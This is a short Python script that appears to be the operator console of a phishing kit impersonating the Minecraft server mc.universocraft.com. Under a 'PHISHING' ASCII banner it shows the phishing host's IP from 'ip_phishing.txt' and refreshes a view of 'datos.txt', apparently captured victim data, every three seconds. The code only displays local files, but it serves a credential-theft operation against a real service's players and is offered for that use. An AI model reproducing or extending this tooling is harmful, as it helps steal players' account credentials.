###############################
# Consola mc.universocraft.com
###############################

import platform
import sys
import socket
import os

from colorama import Fore, init
from time import sleep

init()

so = platform.system()
os.system("title Consola: mc.universocraft.com")

rojo = Fore.RED
lrojo = Fore.LIGHTRED_EX
negro = Fore.BLACK
lnegro = Fore.LIGHTBLACK_EX
blanco = Fore.WHITE
verde = Fore.GREEN
lverde = Fore.LIGHTGREEN_EX
lcyan = Fore.LIGHTCYAN_EX
lmagenta = Fore.LIGHTMAGENTA_EX
reset = Fore.RESET

archivo_ip = open("ip_phishing.txt", "r")
ip = archivo_ip.read()
archivo_ip.close()

def banner():
    print("\n\n" + lrojo + "    ██▓███   ██░ ██  ██▓  ██████  ██░ ██  ██▓ ███▄    █   ▄████ ")
    print("    ▓██░  ██▒▓██░ ██▒▓██▒▒██    ▒ ▓██░ ██▒▓██▒ ██ ▀█   █  ██▒ ▀█▒")
    print("    ▓██░ ██▓▒▒██▀▀██░▒██▒░ ▓██▄   ▒██▀▀██░▒██▒▓██  ▀█ ██▒▒██░▄▄▄░")
    print(blanco + "    ▒██▄█▓▒ ▒░▓█ ░██ ░██░  ▒   ██▒░▓█ ░██ ░██░▓██▒  ▐▌██▒░▓█  ██▓")
    print("    ▒██▒ ░  ░░▓█▒░██▓░██░▒██████▒▒░▓█▒░██▓░██░▒██░   ▓██░░▒▓███▀▒")
    print("    ▒▓▒░ ░  ░ ▒ ░░▒░▒░▓  ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░▓  ░ ▒░   ▒ ▒  ░▒   ▒ ")
    print("    ░▒ ░      ▒ ░▒░ ░ ▒ ░░ ░▒  ░ ░ ▒ ░▒░ ░ ▒ ░░ ░░   ░ ▒░  ░   ░ ")
    print("    ░░        ░  ░░ ░ ▒ ░░  ░  ░   ░  ░░ ░ ▒ ░   ░   ░ ░ ░ ░   ░ ")
    print("            ░  ░  ░ ░        ░   ░  ░  ░ ░           ░       ░ \n\n")
    
def consola():
    banner()
    while True:
        sleep(3)
        os.system("cls")
        banner()
        print(blanco + "    [" + verde + "√" + blanco + "]" + blanco + " IP: " + lrojo + ip)
        print(lverde + "")
        archivo_datos = open("datos.txt", "r", encoding="utf8")
        contenido = archivo_datos.read()
        archivo_datos.close()
        print(contenido)

consola()
